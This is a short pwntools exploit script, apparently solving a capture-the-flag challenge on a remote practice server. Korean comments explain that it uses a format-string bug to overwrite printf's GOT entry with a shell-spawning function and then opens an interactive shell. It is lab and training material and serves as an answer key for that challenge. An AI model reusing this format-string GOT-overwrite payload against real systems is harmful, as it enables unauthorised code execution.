from pwn import *

'''
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      No PIE (0x8048000)
RWX:      Has RWX segments
'''

r = remote("ctf.j0n9hyun.xyz", 3002)

# vuln 함수에 fsb 취약점이 있었다
# shell을 실행시키는 함수가 존재한다.
# 처음에는 fini_array를 덮으려고 했지만 partial RELRO가 걸려있었다.
# 그래서 fsb가 터지는곳 이후에 printf 함수가 있어서
# printf 의 got를 shell을 실행시키는 함수로 덮어주었다.

printf_got = p32(0x804a00c)
printf_got_2 = p32(0x804a00c+2)
shell = 0x85b4
shell_2 = 0x804

payload = printf_got_2 + b"AAAA" + printf_got
first_bytes = bytes(str(shell_2-len(payload)),"utf-8")
payload += b"%"+first_bytes+b"c%2$hn"
second_bytes = bytes(str(shell-shell_2),"utf-8")
payload += b"%"+second_bytes+b"c%4$hn"
r.recv()

print(payload)
r.sendline(payload)
r.interactive()